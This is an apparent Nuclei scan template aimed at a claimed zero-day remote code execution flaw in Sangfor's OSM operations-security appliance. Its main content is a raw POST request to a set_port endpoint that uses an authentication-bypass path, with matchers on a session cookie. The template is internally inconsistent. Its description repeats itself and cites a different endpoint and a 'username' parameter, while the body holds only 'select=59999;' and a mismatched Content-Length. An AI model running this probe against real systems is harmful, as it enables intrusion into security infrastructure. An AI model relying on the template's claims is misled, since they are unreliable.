id: sangfor-osm-set-port-rce

info:
  name: Sangfor OSM set_port - Remote Code Execution
  author: qwtd
  severity: critical
  description: |
    Sangfor OSM set_port contains a remote code execution vulnerability. An attacker can execute arbitrary commands on the server via the "username" parameter.Sangfor OSM portal_login contains a remote code execution vulnerability. An attacker can execute arbitrary commands on the server via the username parameter.
    0day!!!
  tags: SANGFOR-运维安全管理系统
  
http:
  - raw:
      - |
        POST /fort;login/system/netConfig/set_port HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
        Sec-Ch-Ua-Mobile: ?0
        Sec-Ch-Ua-Platform: "Windows"
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng, */* ;q=0.8,application/signed-exchange;v=b3;q=0.7
        Sec-Fetch-Site: none
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Priority: u=0, i
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 4217

        select=59999;

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "FORTSESSIONID="
      - type: status
        status:
          - 200